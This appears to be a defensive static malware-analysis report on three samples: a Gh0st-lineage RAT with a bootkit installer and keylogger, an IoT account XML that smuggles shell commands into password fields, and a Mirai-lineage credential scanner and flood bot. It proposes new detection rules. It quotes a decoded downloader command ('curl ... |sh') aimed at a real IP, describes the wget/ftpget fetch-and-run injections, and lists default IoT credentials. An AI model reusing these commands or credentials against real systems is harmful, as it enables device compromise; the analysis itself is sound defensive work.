method: First reasoned review of supplied bytes. Static analysis only: atomscan, cleave facts, rizin control-flow and instruction disassembly, manual XML/entity/Base64 decoding. No sample or downloaded stage was executed. Filenames, ML scores and reputation were not behavioral proof.

samples.identification: Gh0st-lineage safemon RAT and NtHook kernel/bootkit installer
evidence: PE entry 0x40323f reaches main 0x401c30. Main opens the NtHook device, enables driver-load authority, registers the driver path and invokes driver-load helpers; it later launches rundll32.exe safemon.dll hook2 (0x40264c and 0x402b13).

Embedded PE at outer offset 0xba50: 0x114f6 resolves NtQueryDirectoryFile from ntdll, recovers its syscall index and saves the SSDT target. The syscall-target dispatcher at 0x13d95 routes matching calls to the interceptor. Directory filtering at 0x133c8-0x13429 compares names, removes matching linked records, and copies subsequent records over them.

Driver's real-mode image at child raw offset 0x6c0c saves and replaces INT 13h vector words at 0x4c/0x4e. Hook handles BIOS read functions 02h/42h, calls the original handler, inspects the loaded buffer, and at 0x6cfe writes 66 9a (operand-size-prefixed far call), its relocated payload address and segment. The installer also contains raw sector-write paths.

Embedded safemon at 0x147d8: polling code 0x1000e366 calls GetAsyncKeyState, tests bit 15, tracks Shift/CapsLock, maps released keys and records Enter with line endings. The recorder at 0x1000e130 XORs recorded bytes with 0x62 and passes the resulting buffer, handle and length to its resolved write routine at 0x1000e14f.

At 0x10010a5d the RAT resolves GetClipboardData, calls it with CF_TEXT=1, checks the returned handle, resolves GlobalLock, and copies the acquired text into a tagged record. This coexists with the actual polling recorder and Gh0st manager RTTI.
samples.limits: Static capabilities and attempted installation are established; successful installation, boot infection, command reception or exfiltration were not observed. The collector filename does not establish Amadey, DarkGate, RedLine, Rhadamanthys, Stealc or STOP attribution.

samples.identification: IoT account XML carrying shell-command injection and downloader stages
evidence: Despite its .sh extension this is a parseable Account XML document, not a standalone shell program. Password fields carry semicolon shell separators and command substitutions, exploiting the configuration-to-shell boundary rather than representing ordinary passwords.

After normal XML entity decoding, several fields change directory to /tmp, download a script with wget, chmod it and invoke sh or the local script path. Other fields pipe wget output directly into sh.
Repeated password fields contain ftpget host ftp_av.sh ftp_av.sh followed by sh ftp_av.sh; the fetched output path and invoked stage agree.
The Base64 string in User2 decodes to 'curl http://194.156.102.210/bins/bins.sh |sh &'. The Password value wraps echo/Base64 decoding and pipes the result into sh inside command substitution.
samples.limits: Execution requires an importer vulnerable to shell evaluation of account values. The file was never executed and remote stages were not fetched. Several easy_cloud.sh fields reference easy_add.sh for chmod/execution, so success of every individual stage is not claimed.
trait_changes: Expand the existing password-field ftpget matcher to recognize a preceding wget pipeline while keeping FTP and shell tokens in one XML field.
Add field-bound Base64-to-shell substitution evidence and a hostile encoded-HTTP-downloader injection composite. No username, IP address, payload name or encoded byte string gates the new rule.

samples.identification: Modified static x86-64 Mirai-lineage IoT credential scanner and flood bot
evidence: ELF entry 0x400194 passes main 0x405230 to libc startup. Main initializes the hidden table, forks/detaches, registers attack-vector pointers at 0x400740 and calls scanner 0x406690.

Scanner constructs raw IPv4/TCP SYN packets: protocol 6 at 0x406807, network-order destination port 23 at 0x40680e, TCP header length 5 at 0x406821 and SYN bit at 0x406845. It builds a weighted username/password table by repeatedly calling 0x4064d0.

0x4064d0 allocates and copies both credential strings, then bounded loops at 0x406556 and 0x4065e2 XOR each byte with 0x22. Decoded entries include root, admin, telnetadmin, xmhdipc, juantech, smcadmin, password and device-default pairs.

Table lock/unlock at 0x408410/0x408490 applies four byte lanes of eight words to bounded buffers. The effective combined key is 0x51. Decoded content includes shell dialogue, BusyBox checking, procfs paths, daemon command lines and a Source Engine query.

UDP vector code creates AF_INET/SOCK_DGRAM/IPPROTO_UDP sockets and iterates buffers and target sockets in an unbounded send loop. The existing neutral flood trait binds the relative call to the actual sendto syscall wrapper.

The intended receive wrapper at 0x40b488 now reaches syscall 44/sendto at 0x40b4a3, rather than syscall 45/recvfrom. Calls whose results feed the length-framed parser therefore do not establish receipt of remote commands.
samples.limits: Remote command reception is broken in this supplied variant. Existing receive-bound tasking and remote-flood traits correctly remain absent. Retained scanner and flood code is distinct from demonstrated successful propagation or remotely launched flooding.
trait_changes: Add notable instruction signatures for Telnet SYN construction and a direction-neutral bounded XOR cursor loop; combine them with hidden credential and socket evidence for hostile scanner-code coverage.
Combine retained UDP send-loop code with the independently supported credential scanner under the UDP flood objective, without requiring or claiming working task reception.

Rename dictionary/device and dictionary/query/device composites as profiles, set them suspicious, and remove unsupported denial-of-service/network-communication mappings. Their matchers and scopes are unchanged; historical review.json records retain their original IDs.

verification.controls: 11 static mutation controls passed: original ELF, different destination port, zero XOR keys, removed credentials, removed UDP setup, redirected flood-send calls, non-code section, wrong architecture, XML input, same command text in another field, ordinary password.
verification.rescans: All three atomscan rescans completed with CLEAVE_TRAITS_DIR=., --no-update and --mode slow. XML reports FTP and encoded-downloader injections. ELF has three hostile findings and no receive-bound remote-tasking finding. Windows findings remain supported and unchanged.
verification.dependencies: No fetched package dependency participates in these three local artifacts.
